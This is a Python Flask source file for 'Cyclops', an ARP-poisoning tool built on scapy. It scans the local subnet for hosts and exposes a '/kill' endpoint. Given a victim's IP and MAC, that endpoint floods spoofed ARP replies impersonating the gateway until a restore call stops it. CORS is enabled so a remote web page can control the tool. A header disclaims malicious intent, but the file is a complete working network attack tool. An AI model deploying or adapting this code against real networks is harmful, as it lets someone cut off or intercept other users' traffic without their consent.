# Cyclops
# 
# Cyclops is a python flask based client that utilizes scapy library to perform basic ARP poisoning.
# Natural use of cyclops is by visiting cyclops.fadhlizakiy.com, hence you can also use CURL for requesting from localhost.
# There is no data collection done in client-side by Cyclops, as well as in the server-side.
#
# Cyclops is intended for accademic purpose and it is not justified to be used for malicious intent.
# Using cyclops in public will be easily detected by the network administrator and pin-pointed to you.
# 
#
# Author : Fadhli Zakiy
# Web    : https://fadhlizakiy.com/
# 2021-02-24

# Loading library
from scapy.all import ARP, IP, Ether, srp, arping, conf as scapyConf, send as sendPacket
from flask import Flask, jsonify, request
from flask_cors import CORS, cross_origin

# get your own IP, Mac and Gateway
myIP   = IP().src
myMac  = Ether().src
gateIP = scapyConf.route.route("0.0.0.0")[2]

# initialize flask and CORS to enable cross domain request
app = Flask(__name__)
CORS(app, support_credentials=True)

# restore state
restoreState = 1

# GET /
# binding home
@app.route('/')
def hello_world():
   return "Test flask"

# POST /kill
#   ipAddress  : victim's IP Address
#   macAddress : victim's MAC Address
# poison victim's IP address using scapy send package
@app.route('/kill', methods=['POST','OPTIONS'])
@cross_origin(supports_credentials=True)
def getKill():
    # load global IP
    global gateIP
    global restoreState
    
    # create package
    ipAddress  = request.form.get('ipAddress')
    macAddress = request.form.get('macAddress')
    packet     = ARP(op="who-has", pdst=ipAddress, hwdst=macAddress, psrc=gateIP)
    
    # check flag
    curRest = restoreState

    # sending package as long as restore state does not change
    while restoreState == curRest:
        sendPacket(packet, verbose=False)
    
    return jsonify({"msg":"done"})

# POST /broadcast
# ping address resource protocol
@app.route('/broadcast', methods=['POST','OPTIONS'])
@cross_origin(supports_credentials=True)
def getScan():
    # scan
    result = arping("192.168.1.0/24", timeout=2)[0]
    
    # map all clients
    clients = []
    for sent, received in result:
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})

    return jsonify(clients)

# POST /self
# return self IP address, MAC address and Gateway
@app.route('/self', methods=['POST','OPTIONS'])
@cross_origin(supports_credentials=True)
def getSelf():
    return jsonify({"ip":myIP,"mac":myMac, "gateway" : gateIP})

# POST /restore
# stop poisoning
@app.route('/restore', methods=['POST','OPTIONS'])
@cross_origin(supports_credentials=True)
def getRestore():
    # load global variables
    global restoreState

    # switch state
    if restoreState == 1:
        restoreState = 0
    else :
        restoreState = 1

    return jsonify({"msg":"done"})

# run flask
if __name__ == '__main__':
   app.run("localhost", 9000, True)